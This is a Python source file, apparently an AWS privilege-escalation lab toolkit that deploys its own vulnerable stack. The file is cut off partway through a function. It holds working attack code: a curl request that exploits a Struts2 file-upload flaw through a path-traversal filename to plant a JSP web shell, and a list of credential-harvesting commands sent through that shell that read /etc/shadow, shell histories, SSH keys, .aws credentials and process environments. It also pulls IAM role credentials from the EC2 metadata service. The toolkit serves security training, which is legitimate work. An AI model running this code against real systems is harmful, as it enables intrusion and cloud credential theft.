#!/usr/bin/env python3
"""
AWS Lambda Privilege Escalation Testing Toolkit - Refactored Main Application
Modern, clean implementation with proper utility module integration
"""
import sys
import os
import json
import time
import random
import subprocess
import argparse
import logging
from datetime import datetime
from pathlib import Path

# Import utility modules
from utils import AWSManager, SSHKeyManager, LambdaPackageBuilder, SafetyManager
from utils.aws_utils import test_ami_detection
from utils.ssh_utils import create_aws_key_pair
from utils.enhanced_logging import (
    EnhancedLogger, LogLevel, SecurityEventType, 
    get_logger, setup_logging
)

# AWS Clients (initialized later)
cloudformation = None
iam = None  
ec2 = None

# Configuration
RANDOM_ID = random.randint(1, 4096)
STACK_NAME = f"IAMMisconfigDemo-{RANDOM_ID}"
OUTPUT_FILE = f"resources-{RANDOM_ID}.json"


class LambdaTestingToolkit:
    """Main application class for the Lambda Testing Toolkit"""
    
    def __init__(self):
        self.aws_manager = None
        self.ssh_manager = None
        self.lambda_builder = None
        self.safety_manager = SafetyManager()
        self.current_stack_name = None
        self.project_config = self._load_project_config()
        
        # Initialize enhanced logging system
        self.logger = setup_logging(
            log_level=logging.INFO,
            enable_file_logging=True,
            log_directory="logs"
        )
        
        # Initialize utility managers
        self._initialize_managers()
        
    def _load_project_config(self):
        """Load project configuration with defaults"""
        return {
            "project_name": "lambda-testing-toolkit",
            "environment": "testing",
            "default_template": "templates/lambdalabs_infrastructure.yaml"
        }
        
    def _initialize_managers(self):
        """Initialize utility managers"""
        try:
            self.logger.info("Initializing AWS Lambda Testing Toolkit...")
            
            # Track initialization progress
            with self.logger.start_progress() as progress:
                # Initialize AWS manager
                init_task = progress.start_operation("Initializing AWS Manager")
                self.aws_manager = AWSManager()
                progress.complete_operation(init_task, success=True)
                
                # Run pre-flight checks
                preflight_task = progress.start_operation("Running pre-flight verification")
                from utils.preflight_checks import PreflightChecker
                
                checker = PreflightChecker(self.aws_manager)
                checks_passed = checker.run_all_checks()
                progress.complete_operation(preflight_task, success=checks_passed)
                
                if not checks_passed:
                    self.logger.warning("Pre-flight checks failed. Please fix the issues above.")
                    self.logger.info("💡 You can ignore warnings, but errors must be resolved.")
                    
                    response = input("\nProceed anyway? (y/N): ").lower().strip()
                    if response != 'y':
                        self.logger.info("Deployment cancelled by user")
                        sys.exit(1)
                    else:
                        self.logger.warning("Proceeding despite pre-flight check failures...")
                
                # Initialize SSH manager
                ssh_task = progress.start_operation("Initializing SSH Manager")
                self.ssh_manager = SSHKeyManager()
                progress.complete_operation(ssh_task, success=True)
                
                # Initialize Lambda builder
                lambda_task = progress.start_operation("Initializing Lambda Builder")
                self.lambda_builder = LambdaPackageBuilder()
                progress.complete_operation(lambda_task, success=True)
                
                # Initialize AWS clients using the session from aws_manager
                client_task = progress.start_operation("Initializing AWS API Clients")
                global cloudformation, iam, ec2
                cloudformation = self.aws_manager.session.client("cloudformation")
                iam = self.aws_manager.session.client("iam")
                ec2 = self.aws_manager.session.client("ec2")
                progress.complete_operation(client_task, success=True)
            
            self.logger.success("All managers initialized successfully")
            
        except Exception as e:
            self.logger.error(
                f"Failed to initialize toolkit: {str(e)}",
                suggestion="Please check your AWS credentials and configuration"
            )
            sys.exit(1)
            
    def deploy_infrastructure(self):
        """Deploy AWS infrastructure using CloudFormation"""
        # Show security disclaimer
        self.safety_manager.show_security_disclaimer()
        
        # Get user confirmation
        if not self.safety_manager.get_user_confirmation("AWS Infrastructure Deployment"):
            return False
            
        # Validate operation safety (dry-run check)
        is_safe, can_proceed = self.safety_manager.validate_operation_safety("deploy_infrastructure")
        if not can_proceed:
            return False
            
        try:
            # Select and prepare template
            template_file = self._select_template()
            if not template_file:
                return False
                
            # Get dynamic AMI for the current region
            self.logger.info(f"Getting latest Amazon Linux 2 AMI for {self.aws_manager.current_region}...")
            ami_id, ami_name, arch = self.aws_manager.get_latest_amazon_linux_ami()
            
            # Handle SSH key setup
            private_key_path, public_key_content, key_name = self.ssh_manager.select_or_create_key()
            
            # Show cost estimation with proper separation
            self.logger.info("\n" + "="*50)
            self.logger.info("💰 Cost Estimation:")
            self.logger.info("="*50)
            cost_info = self.aws_manager.estimate_deployment_cost()
            
            # Final confirmation with details
            deployment_details = [
                f"Template: {template_file}",
                f"AMI: {ami_id} ({ami_name})",
                f"SSH Key: {key_name}",
                f"Region: {self.aws_manager.current_region}",
                f"Estimated daily cost: ${cost_info['daily']:.4f}"
            ]
            
            if not self.safety_manager.get_user_confirmation("Final Deployment Confirmation", deployment_details):
                return False
                
            # Read and prepare template
            template_body = self._read_template(template_file)
            
            # Generate unique stack name with lambdalabs identifier
            timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
            self.current_stack_name = f"lambdalabs-{timestamp}"
            
            # Prepare CloudFormation parameters
            parameters = [
                {
                    'ParameterKey': 'ProjectName',
                    'ParameterValue': self.project_config['project_name']
                },
                {
                    'ParameterKey': 'AmazonLinuxAMI',
                    'ParameterValue': ami_id
                },
                {
                    'ParameterKey': 'SSHKeyName',
                    'ParameterValue': key_name
                },
                {
                    'ParameterKey': 'SSHPublicKey',
                    'ParameterValue': public_key_content
                },
                {
                    'ParameterKey': 'EnvironmentTag',
                    'ParameterValue': self.project_config['environment']
                }
            ]
            
            # Deploy CloudFormation stack with progress tracking
            with self.logger.start_progress() as progress:
                deploy_task = progress.start_operation(f"Deploying CloudFormation stack: {self.current_stack_name}")
                
                response = cloudformation.create_stack(
                    StackName=self.current_stack_name,
                    TemplateBody=template_body,
                    Parameters=parameters,
                    Capabilities=["CAPABILITY_NAMED_IAM"],
                    Tags=[
                        {'Key': 'Project', 'Value': self.project_config['project_name']},
                        {'Key': 'Environment', 'Value': self.project_config['environment']},
                        {'Key': 'Purpose', 'Value': 'security-testing'},
                        {'Key': 'CreatedBy', 'Value': 'lambda-testing-toolkit'},
                        {'Key': 'Lab', 'Value': 'lambdalabs'}
                    ]
                )
                
                stack_id = response["StackId"]
                self.logger.info(f"Stack creation initiated: {stack_id}")
                progress.complete_operation(deploy_task, success=True)
                
                # Create deployment record
                record_task = progress.start_operation("Creating deployment record")
                self.safety_manager.create_deployment_record(self.current_stack_name, {
                    'template': template_file,
                    'ami_id': ami_id,
                    'key_name': key_name,
                    'region': self.aws_manager.current_region
                })
                progress.complete_operation(record_task, success=True)
                
                # Wait for completion with progress indication
                wait_task = progress.start_operation("Waiting for stack creation to complete")
                waiter = cloudformation.get_waiter("stack_create_complete")
                waiter.wait(StackName=self.current_stack_name)
                progress.complete_operation(wait_task, success=True)
            
            self.logger.success(f"Stack creation complete: {self.current_stack_name}")
            
            # Save resources
            self._save_stack_resources()
            
            return True
            
        except Exception as e:
            self.logger.error(
                f"Stack deployment failed: {str(e)}",
                suggestion="Check CloudFormation console for detailed error information"
            )
            # Clean up deployment record on failure
            if self.current_stack_name:
                self.safety_manager.remove_deployment_record(self.current_stack_name)
            return False
            
    def _select_template(self):
        """Select CloudFormation template to deploy"""
        templates_dir = Path("templates")
        
        # Find available templates
        yaml_files = []
        
        # Check templates directory
        if templates_dir.exists():
            yaml_files.extend(list(templates_dir.glob("*.yaml")))
            yaml_files.extend(list(templates_dir.glob("*.yml")))
            
        # Check current directory for legacy templates
        yaml_files.extend(list(Path(".").glob("*.yaml")))
        yaml_files.extend(list(Path(".").glob("*.yml")))
        
        if not yaml_files:
            self.logger.error(
                "No CloudFormation templates found",
                suggestion="Please ensure template files (.yaml/.yml) are available in 'templates/' or current directory"
            )
            return None
            
        # Remove duplicates and sort
        yaml_files = sorted(list(set(yaml_files)), key=lambda x: x.name)
        
        self.logger.user_feedback.show_status("Available CloudFormation templates:", LogLevel.INFO)
        for idx, file in enumerate(yaml_files, start=1):
            self.logger.console.print(f" [{idx}] {file}", style="cyan")
            
        while True:
            try:
                choice = int(input(f"\nSelect a template (1-{len(yaml_files)}): "))
                if 1 <= choice <= len(yaml_files):
                    selected_template = yaml_files[choice - 1]
                    self.logger.success(f"Selected template: {selected_template}")
                    return str(selected_template)
                else:
                    self.logger.error(f"Please enter a number between 1 and {len(yaml_files)}")
            except ValueError:
                self.logger.error("Please enter a valid number")
                
    def _read_template(self, file_path):
        """Read CloudFormation template file"""
        try:
            with open(file_path, "r") as file:
                return file.read()
        except Exception as e:
            raise Exception(f"Failed to read template {file_path}: {str(e)}")
            
    def _save_stack_resources(self):
        """Save stack resources to JSON file with retry logic"""
        max_retries = 5
        retry_interval = 10
        
        for attempt in range(max_retries):
            try:
                # Get stack resources
                resources = self._get_stack_resources()
                if not resources:
                    raise Exception("No stack resources found")
                    
                # Get ARNs and additional info
                arn_data = self._get_resource_arns(resources)
                
                # Check if EC2 instance has public DNS
                ec2_public_dns = None
                for logical_id, arn_info in arn_data.items():
                    if isinstance(arn_info, dict) and 'PublicDNS' in arn_info:
                        ec2_public_dns = arn_info['PublicDNS']
                        break
                        
                if ec2_public_dns and ec2_public_dns != "N/A" and ec2_public_dns != "":
                    self.logger.info(f"EC2 Public DNS confirmed: {ec2_public_dns}")
                    break
                else:
                    self.logger.warning(f"EC2 Public DNS not yet available (attempt {attempt+1}/{max_retries})")
                    if attempt < max_retries - 1:
                        time.sleep(retry_interval)
                        
            except Exception as e:
                self.logger.warning(f"Attempt {attempt+1} failed: {str(e)}")
                if attempt < max_retries - 1:
                    time.sleep(retry_interval)
                    
        # Save the data regardless
        try:
            output_data = {
                "StackName": self.current_stack_name,
                "DeploymentTime": datetime.utcnow().isoformat(),
                "Resources": resources,
                "ARNs": arn_data,
                "ProjectConfig": self.project_config
            }
            
            output_file = f"resources-{self.current_stack_name}.json"
            with open(output_file, "w") as json_file:
                json.dump(output_data, json_file, indent=4)
                
            self.logger.info(f"Resource data saved to {output_file}")
            
        except Exception as e:
            self.logger.error(f"Failed to save resource data: {str(e)}")
            
    def _get_stack_resources(self):
        """Get CloudFormation stack resources"""
        try:
            response = cloudformation.describe_stack_resources(StackName=self.current_stack_name)
            resources = response.get("StackResources", [])
            
            # Convert timestamps to strings
            for res in resources:
                if "Timestamp" in res and hasattr(res["Timestamp"], "isoformat"):
                    res["Timestamp"] = res["Timestamp"].isoformat()
                    
            return resources
            
        except Exception as e:
            self.logger.error(f"Failed to retrieve stack resources: {str(e)}")
            return []
            
    def _get_resource_arns(self, resources):
        """Get ARNs and additional information for resources"""
        arn_data = {}
        
        for res in resources:
            res_id = res["PhysicalResourceId"] 
            res_type = res["ResourceType"]
            logical_id = res["LogicalResourceId"]
            
            # Skip resources without ARNs
            if res_type == "AWS::IAM::UserToGroupAddition":
                continue
                
            try:
                if "AWS::IAM::Role" in res_type:
                    role = iam.get_role(RoleName=res_id)
                    arn_data[logical_id] = role["Role"]["Arn"]
                    
                elif "AWS::IAM::User" in res_type:
                    user = iam.get_user(UserName=res_id)
                    arn_data[logical_id] = user["User"]["Arn"]
                    
                elif "AWS::EC2::Instance" in res_type:
                    instances = ec2.describe_instances(InstanceIds=[res_id])
                    instance_data = instances["Reservations"][0]["Instances"][0]
                    
                    arn_data[logical_id] = {
                        "InstanceId": res_id,
                        "PublicDNS": instance_data.get("PublicDnsName", "N/A"),
                        "PublicIP": instance_data.get("PublicIpAddress", "N/A"),
                        "PrivateIP": instance_data.get("PrivateIpAddress", "N/A"),
                        "State": instance_data["State"]["Name"]
                    }
                    
                elif "AWS::EC2::KeyPair" in res_type:
                    arn_data[logical_id] = {
                        "KeyName": res_id,
                        "KeyPairId": res_id
                    }
                    
            except Exception as e:
                self.logger.warning(f"Could not get details for {res_type} ({res_id}): {str(e)}")
                arn_data[logical_id] = "ERROR_RETRIEVING_DATA"
                
        return arn_data
        
    def upload_web_shell(self):
        """Upload JSP web shell to EC2 instance"""
        print("\n🚀 Web Shell Upload to EC2 Instance")
        print("This will upload a JSP web shell to the vulnerable Struts2 application")
        
        # Get user confirmation
        if not self.safety_manager.get_user_confirmation("Web Shell Upload"):
            return False
            
        # Validate operation safety
        is_safe, can_proceed = self.safety_manager.validate_operation_safety("upload_web_shell")
        if not can_proceed:
            return False
            
        try:
            # Load the latest deployment resources
            deployment_data = self._load_latest_deployment()
            if not deployment_data:
                self.logger.error(
                    "No active deployment found",
                    suggestion="Please deploy infrastructure first using Option 1"
                )
                return False
                
            # Get EC2 public DNS
            ec2_public_dns = self._get_ec2_public_dns(deployment_data)
            if not ec2_public_dns:
                self.logger.error(
                    "EC2 public DNS not available",
                    suggestion="Instance may still be initializing - wait a few minutes and try again"
                )
                return False
                
            # List available JSP files
            jsp_file = self._select_jsp_file()
            if not jsp_file:
                return False
                
            # Upload the file via curl (Struts2 vulnerability)
            success = self._upload_via_struts2_vulnerability(jsp_file, ec2_public_dns)
            
            if success:
                self.logger.success("Web shell uploaded successfully!")
                self.logger.info(f"Access the shell at: http://{ec2_public_dns}:8080/shell.jsp")
                self.logger.info("You can now execute commands through the web interface")
                return True
            else:
                self.logger.error(
                    "Web shell upload failed",
                    suggestion="Check network connectivity and ensure the target application is vulnerable to file upload"
                )
                return False
                
        except Exception as e:
            self.logger.error(
                f"Web shell upload failed: {str(e)}",
                suggestion="Check EC2 instance status and network connectivity"
            )
            return False
            
    def _load_latest_deployment(self):
        """Load the most recent deployment data"""
        deployment_files = list(Path(".").glob("resources-*.json"))
        
        if not deployment_files:
            return None
            
        # Get the most recent deployment file
        latest_deployment = max(deployment_files, key=os.path.getctime)
        
        try:
            with open(latest_deployment, "r") as f:
                return json.load(f)
        except Exception as e:
            self.logger.error(
                f"Failed to load deployment data from {latest_deployment}: {str(e)}",
                suggestion="Ensure the file exists and contains valid JSON. Try running Option 1 to create a new deployment."
            )
            return None
            
    def _get_ec2_public_dns(self, deployment_data):
        """Extract EC2 public DNS from deployment data"""
        try:
            arns = deployment_data.get("ARNs", {})
            
            # Check common logical IDs for EC2 instances
            ec2_logical_ids = ["DevTeamEC2Instance", "WebServerInstance", "EC2Instance"]
            
            for logical_id in ec2_logical_ids:
                if logical_id in arns:
                    instance_data = arns[logical_id]
                    if isinstance(instance_data, dict) and "PublicDNS" in instance_data:
                        public_dns = instance_data["PublicDNS"]
                        if public_dns and public_dns != "N/A" and public_dns != "":
                            return public_dns
                            
            # If no public DNS found, return None
            return None
            
        except Exception as e:
            self.logger.error(
                f"Failed to extract EC2 public DNS: {str(e)}",
                suggestion="Check that deployment data contains valid EC2 instance information. The instance may still be initializing."
            )
            return None
            
    def _select_jsp_file(self):
        """Allow user to select a JSP file for upload"""
        # Check both payloads/shells and current directory for JSP files
        jsp_files = []
        jsp_files.extend(list(Path("payloads/shells").glob("*.jsp")))
        jsp_files.extend(list(Path(".").glob("*.jsp")))
        
        if not jsp_files:
            self.logger.error(
                "No JSP files found for upload",
                suggestion="Please ensure you have JSP web shell files in payloads/shells/ or current directory"
            )
            return None
            
        print("\nAvailable JSP files for upload:")
        for idx, file in enumerate(jsp_files, start=1):
            file_size = file.stat().st_size
            print(f" [{idx}] {file.name} ({file_size} bytes)")
            
        while True:
            try:
                choice = int(input(f"\nSelect a JSP file (1-{len(jsp_files)}): "))
                if 1 <= choice <= len(jsp_files):
                    selected_file = jsp_files[choice - 1]
                    print(f"[INFO] Selected: {selected_file.name}")
                    return str(selected_file)
                else:
                    self.logger.error(
                        f"Please enter a number between 1 and {len(jsp_files)}",
                        suggestion="Enter a valid number within the specified range"
                    )
            except ValueError:
                self.logger.error(
                    "Please enter a valid number",
                    suggestion="Input must be numeric (1-9 digits only)"
                )
            except KeyboardInterrupt:
                print("\n[INFO] File selection cancelled")
                return None
                
    def _upload_via_struts2_vulnerability(self, jsp_file, ec2_public_dns):
        """Upload JSP file via Struts2 file upload vulnerability"""
        upload_url = f"http://{ec2_public_dns}:8080/index.action"
        
        print(f"[INFO] Uploading {Path(jsp_file).name} to {upload_url}...")
        print(f"[INFO] Exploiting Struts2 file upload vulnerability...")
        
        # Prepare curl command to exploit Struts2 vulnerability
        curl_command = [
            "curl", "-X", "POST", upload_url,
            "-F", f"file=@{jsp_file};filename=shell.jsp;type=text/plain",
            "-F", "top.fileFileName=../shell.jsp",
            "-v",
            "--connect-timeout", "10",
            "--max-time", "30",
            "-w", "\nHTTP_CODE:%{http_code}\nRESPONSE_TIME:%{time_total}\n"
        ]
        
        print(f"[DEBUG] Curl command: {' '.join(curl_command)}")
        
        try:
            # Execute the curl command
            result = subprocess.run(curl_command, 
                                    capture_output=True, 
                                    text=True, 
                                    timeout=45)
            
            print(f"[DEBUG] Curl return code: {result.returncode}")
            print(f"[DEBUG] Curl stdout: {result.stdout[:1000] if result.stdout else 'No stdout'}")
            print(f"[DEBUG] Curl stderr: {result.stderr[:1000] if result.stderr else 'No stderr'}")
            
            # Check if upload was successful
            if result.returncode == 0:
                # Look for HTTP status codes in output
                output_combined = (result.stdout or "") + (result.stderr or "")
                
                # Extract HTTP code using regex
                import re
                http_code_match = re.search(r'HTTP_CODE:(\d+)', output_combined)
                
                if http_code_match:
                    http_code = http_code_match.group(1)
                    print(f"[INFO] Server returned HTTP {http_code}")
                    
                    # Accept various success codes
                    if http_code in ['200', '201', '302', '303']:
                        self.logger.success("File upload completed successfully!")
                        # Also check for success indicators in response body
                        if "Upload Success" in output_combined or "200" in output_combined:
                            self.logger.info("Upload confirmed by server response")
                        return True
                    else:
                        self.logger.error(
                            f"Server returned error code: HTTP {http_code}",
                            suggestion="Verify the target application is running and accessible. Check if the vulnerability still exists."
                        )
                        return False
                else:
                    # Fallback: look for common success indicators
                    if "200 OK" in output_combined or "Upload Success" in output_combined:
                        self.logger.success("File upload completed successfully!")
                        return True
                    elif "< HTTP/1.1 200" in output_combined:
                        self.logger.success("File upload completed successfully!")
                        return True
                    else:
                        self.logger.warning(
                            "Could not determine upload status from server response",
                            suggestion="Check server logs or try uploading again. The upload may have succeeded despite unclear response."
                        )
                        return False
            else:
                self.logger.error(
                    f"Curl command failed with return code: {result.returncode}",
                    suggestion="Check network connectivity and curl installation. Verify target server is reachable."
                )
                return False
                
        except subprocess.TimeoutExpired:
            self.logger.error(
                "Upload request timed out",
                suggestion="Check network connectivity. The target server may be slow or unresponsive."
            )
            return False
        except subprocess.CalledProcessError as e:
            self.logger.error(
                f"Upload command failed: {str(e)}",
                suggestion="Verify curl is installed and properly configured. Check command syntax and parameters."
            )
            return False
        except Exception as e:
            self.logger.error(
                f"Unexpected error during upload: {str(e)}",
                suggestion="This is an unexpected error. Please report this issue with the full error details."
            )
            return False
            
    def execute_enumeration_commands(self):
        """Execute system enumeration commands via uploaded web shell"""
        print("\n" + "="*60)
        print("🔍 ADVANCED CREDENTIAL HARVESTING VIA WEB SHELL")
        print("="*60)
        print("🎯 This will execute specialized credential discovery commands on the target EC2 instance")
        
        # Get user confirmation
        if not self.safety_manager.get_user_confirmation("System Enumeration"):
            return False
            
        # Validate operation safety
        is_safe, can_proceed = self.safety_manager.validate_operation_safety("execute_enumeration")
        if not can_proceed:
            return False
            
        try:
            # Load the latest deployment resources
            deployment_data = self._load_latest_deployment()
            if not deployment_data:
                self.logger.error(
                    "No active deployment found",
                    suggestion="Please deploy infrastructure first using Option 1"
                )
                return False
                
            # Get EC2 public DNS
            ec2_public_dns = self._get_ec2_public_dns(deployment_data)
            if not ec2_public_dns:
                self.logger.error(
                    "EC2 public DNS not available",
                    suggestion="Instance may still be initializing - wait a few minutes and try again"
                )
                return False
                
            # Check if web shell is accessible
            if not self._verify_web_shell_access(ec2_public_dns):
                self.logger.error(
                    "Web shell not accessible",
                    suggestion="Please upload the web shell first using Option 4"
                )
                return False
                
            # Execute enumeration commands
            results = self._execute_enum_commands(ec2_public_dns)
            
            if results:
                # Save results to file
                output_file = self._save_enumeration_results(results)
                self.logger.success("Credential harvesting completed!")
                self.logger.info(f"Credential scan results saved to: {output_file}")
                self.logger.info(f"Executed {len([r for r in results.values() if 'SUCCESS' in str(r)])} commands successfully")
                return True
            else:
                self.logger.error(
                    "No enumeration results obtained",
                    suggestion="Check web shell accessibility and network connectivity"
                )
                return False
                
        except Exception as e:
            self.logger.error(
                f"Enumeration failed: {str(e)}",
                suggestion="Verify web shell is accessible and EC2 instance is responding"
            )
            return False
            
    def _verify_web_shell_access(self, ec2_public_dns):
        """Verify that the web shell is accessible"""
        shell_url = f"http://{ec2_public_dns}:8080/shell.jsp"
        
        try:
            import urllib.request
            import urllib.parse
            
            # Try a simple test command
            params = urllib.parse.urlencode({'cmd': 'whoami'})
            request_url = f"{shell_url}?{params}"
            
            with urllib.request.urlopen(request_url, timeout=10) as response:
                content = response.read().decode('utf-8')
                
            # Check if the response contains expected JSP shell content
            if "Commands with JSP" in content and "Command:" in content:
                print("[INFO] Web shell is accessible and responding")
                return True
            else:
                print("[WARNING] Web shell responded but content is unexpected")
                return False
                
        except Exception as e:
            self.logger.error(
                f"Failed to verify web shell access: {str(e)}",
                suggestion="Check network connectivity and ensure the web shell was uploaded successfully"
            )
            return False
            
    def _execute_enum_commands(self, ec2_public_dns):
        """Execute advanced credential harvesting commands"""
        shell_url = f"http://{ec2_public_dns}:8080/shell.jsp"
        
        # Enhanced credential harvesting command set
        enum_commands = [
            # System Context (keep a few essential commands)
            "whoami",
            "id",
            "hostname",
            
            # SSH Key Discovery
            "find /home -name '*.pem' -o -name '*rsa*' -o -name '*dsa*' -o -name 'authorized_keys' 2>/dev/null",
            "find /root -name '*.pem' -o -name '*rsa*' -o -name '*dsa*' 2>/dev/null",
            "find / -name 'known_hosts' 2>/dev/null | head -10",
            
            # History Files (Command history often contains passwords)
            "cat ~/.bash_history 2>/dev/null || echo 'No bash history'",
            "cat ~/.zsh_history 2>/dev/null || echo 'No zsh history'",
            "find /home -name '.*history' -exec ls -la {} \; 2>/dev/null",
            "cat /root/.*history 2>/dev/null || echo 'No root history available'",
            
            # Configuration Files with Credentials
            "find /etc -name '*.conf' -exec grep -l 'password\|secret\|key' {} \; 2>/dev/null | head -20",
            "grep -r 'password\|secret\|key' /etc/ 2>/dev/null | head -20",
            "cat /etc/shadow 2>/dev/null || echo 'shadow not readable'",
            
            # Application-Specific Credential Files
            "find / -name '*.key' -o -name '*.crt' -o -name '*.pem' -not -path '*/proc/*' 2>/dev/null | head -20",
            "find / -name 'wp-config.php' -o -name 'database.yml' -o -name '.env' 2>/dev/null",
            
            # AWS/Cloud Credentials in User Directories
            "find /home -name '.aws' -type d 2>/dev/null",
            "find /home -name 'credentials' -path '*/.aws/*' -exec cat {} \; 2>/dev/null",
            "find / -name 'credentials.json' -o -name 'creds.json' 2>/dev/null",
            
            # Process & Memory Inspection
            "ps auxww | grep -i 'password\|secret\|key\|token' | grep -v 'grep'",
            "ps -eo pid,user,command --no-headers | grep -E '(ssh|mysql|postgres|redis)'",
            "cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i 'password\|secret\|key\|token' | head -20 || echo 'No sensitive env vars found'"
        ]
        
        print(f"[INFO] Executing {len(enum_commands)} enumeration commands...")
        
        results = {}
        successful_commands = 0
        
        for i, cmd in enumerate(enum_commands, 1):
            try:
                print(f"[INFO] [{i}/{len(enum_commands)}] Executing: {cmd[:50]}{'...' if len(cmd) > 50 else ''}")
                
                # Execute command via web shell
                result = self._execute_single_command(shell_url, cmd)
                
                if result and "SUCCESS" in result:
                    results[cmd] = result
                    successful_commands += 1
                    self.logger.success("Command completed")
                else:
                    results[cmd] = result or "No response"
                    print(f"[WARNING] Command may have failed or returned no data")
                    
                # Small delay to avoid overwhelming the server
                time.sleep(1)
                
            except Exception as e:
                self.logger.error(
                    f"Failed to execute '{cmd}': {str(e)}",
                    suggestion="Check web shell connectivity and command syntax. Verify the target system is responding."
                )
                results[cmd] = f"ERROR: {str(e)}"
                
        print(f"\n[INFO] Enumeration complete: {successful_commands}/{len(enum_commands)} commands successful")
        return results
        
    def _execute_single_command(self, shell_url, command):
        """Execute a single command via the web shell"""
        try:
            import urllib.request
            import urllib.parse
            
            # Encode the command parameter
            params = urllib.parse.urlencode({'cmd': command})
            request_url = f"{shell_url}?{params}"
            
            # Execute the request with timeout
            with urllib.request.urlopen(request_url, timeout=15) as response:
                content = response.read().decode('utf-8', errors='ignore')
                
            # Parse the HTML response to extract command output
            output = self._extract_command_output(content)
            
            if output and output.strip():
                return f"SUCCESS: {output}"
            else:
                return "WARNING: No output received"
                
        except Exception as e:
            return f"ERROR: {str(e)}"
            
    def _extract_command_output(self, html_content):
        """Extract command output from JSP shell HTML response"""
        try:
            # Look for content between <pre> tags (where command output appears)
            import re
            
            # Find content between Command: and </pre>
            pattern = r'Command:.*?<BR>\s*([\s\S]*?)\s*</pre>'
            match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
            
            if match:
                output = match.group(1).strip()
                # Clean up HTML entities and extra whitespace
                output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
                return output
            else:
                # Fallback: try to find any content in <pre> tags
                pre_pattern = r'<pre[^>]*>([\s\S]*?)</pre>'
                pre_match = re.search(pre_pattern, html_content, re.IGNORECASE | re.DOTALL)
                if pre_match:
                    content = pre_match.group(1).strip()
                    # Remove the "Command: ..." line if present
                    lines = content.split('\n')
                    if lines and 'Command:' in lines[0]:
                        return '\n'.join(lines[1:]).strip()
                    return content
                    
            return "No output found"
            
        except Exception as e:
            return f"Parse error: {str(e)}"
            
    def _save_enumeration_results(self, results):
        """Save enumeration results to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        output_file = f"enum_outputs_{timestamp}.txt"
        
        try:
            with open(output_file, "w", encoding='utf-8') as f:
                f.write("="*60 + "\n")
                f.write("AWS Lambda Testing Toolkit - Advanced Credential Harvesting Results\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write("="*60 + "\n\n")
                
                for cmd, result in results.items():
                    f.write(f"### Command: {cmd}\n")
                    f.write("-" * 40 + "\n")
                    
                    # Clean up the result output
                    if result.startswith("SUCCESS: "):
                        output = result[9:].strip()  # Remove "SUCCESS: " prefix
                        f.write(output + "\n")
                    else:
                        f.write(result + "\n")
                        
                    f.write("\n" + "="*40 + "\n\n")
                    
            return output_file
            
        except Exception as e:
            self.logger.error(
                f"Failed to save results: {str(e)}",
                suggestion="Check disk space and file permissions for the output directory"
            )
            return None
            
    def extract_aws_credentials(self):
        """Extract AWS IAM credentials from EC2 instance metadata service"""
        print("\n" + "="*60)
        print("🔐 AWS CREDENTIAL EXTRACTION VIA WEB SHELL")
        print("="*60)
        print("🎯 This will extract IAM credentials from the EC2 instance metadata service")
        
        # Get user confirmation
        if not self.safety_manager.get_user_confirmation("AWS Credential Extraction"):
            return False
            
        # Validate operation safety
        is_safe, can_proceed = self.safety_manager.validate_operation_safety("extract_credentials")
        if not can_proceed:
            return False
            
        try:
            # Load the latest deployment resources
            deployment_data = self._load_latest_deployment()
            if not deployment_data:
                self.logger.error(
                    "No active deployment found",
                    suggestion="Please deploy infrastructure first using Option 1"
                )
                return False
                
            # Get EC2 public DNS
            ec2_public_dns = self._get_ec2_public_dns(deployment_data)
            if not ec2_public_dns:
                self.logger.error(
                    "EC2 public DNS not available",
                    suggestion="Instance may still be initializing - wait a few minutes and try again"
                )
                return False
                
            # Check if web shell is accessible
            if not self._verify_web_shell_access(ec2_public_dns):
                self.logger.error(
                    "Web shell not accessible",
                    suggestion="Please upload the web shell first using Option 4"
                )
                return False
                
            # Extract credentials from metadata service
            credentials = self._extract_credentials_from_metadata(ec2_public_dns)
            
            if credentials:
                # Save credentials to shell script
                script_file = self._save_credentials_script(credentials)
                
                self.logger.success("AWS credentials extracted successfully!")
                self.logger.info(f"Credentials saved to: {script_file}")
                self.logger.info(f"To use these credentials, run: source {script_file}")
                
                # Show credential summary (without exposing secrets)
                print(f"\n📋 Credential Summary:")
                print(f"   Access Key ID: {credentials['AccessKeyId'][:8]}...{credentials['AccessKeyId'][-4:]}")
                print(f"   Secret Key: ****** (hidden)")
                print(f"   Session Token: ****** (hidden)")
                print(f"   Expiration: {credentials.get('Expiration', 'Not specified')}")
                
                return True
            else:
                self.logger.error(
                    "Failed to extract AWS credentials",
                    suggestion="Check web shell accessibility and EC2 instance metadata service availability"
                )
                return False
                
        except Exception as e:
            self.logger.error(
                f"Credential extraction failed: {str(e)}",
                suggestion="Verify web shell is accessible and EC2 instance has IAM role attached"
            )
            return False
            
    def _extract_credentials_from_metadata(self, ec2_public_dns):
        """Extract credentials from EC2 metadata service via web shell"""
        shell_url = f"http://{ec2_public_dns}:8080/shell.jsp"
        
        # First, discover the role name
        role_name = self._discover_iam_role_name(shell_url)
        if not role_name:
            self.logger.error(
                "Could not discover IAM role name from metadata service",
                suggestion="Verify EC2 instance has an IAM role attached and metadata service is accessible"
            )
            return None
            
        print(f"[INFO] Found IAM role: {role_name}")
        
        # Construct metadata URL for the discovered role
        metadata_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        
        print(f"[INFO] Extracting credentials from metadata service...")
        print(f"[DEBUG] Metadata URL: {metadata_url}")
        
        # Execute curl command to get credentials
        curl_command = f"curl -s {metadata_url}"
        
        try:
            # Execute the command via web shell
            result = self._execute_single_command(shell_url, curl_command)
            
            if not result or "SUCCESS:" not in result:
                self.logger.error(
                    f"Failed to retrieve metadata: {result}",
                    suggestion="Check network connectivity to metadata service and web shell functionality"
                )
                return None
                
            # Extract the JSON response
            raw_data = result[8:].strip()  # Remove "SUCCESS: " prefix
            
            print(f"[DEBUG] Raw metadata response: {raw_data[:200]}...")
            
            # Parse the JSON response to extract credentials
            return self._parse_credentials_from_json(raw_data)
            
        except Exception as e:
            self.logger.error(
                f"Failed to extract credentials: {str(e)}",
                suggestion="Verify metadata service URL and network connectivity"
            )
            return None
            
    def _discover_iam_role_name(self, shell_url):
        """Discover IAM role name from metadata service"""
        # List available IAM roles
        list_roles_command = "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        
        try:
            result = self._execute_single_command(shell_url, list_roles_command)
            
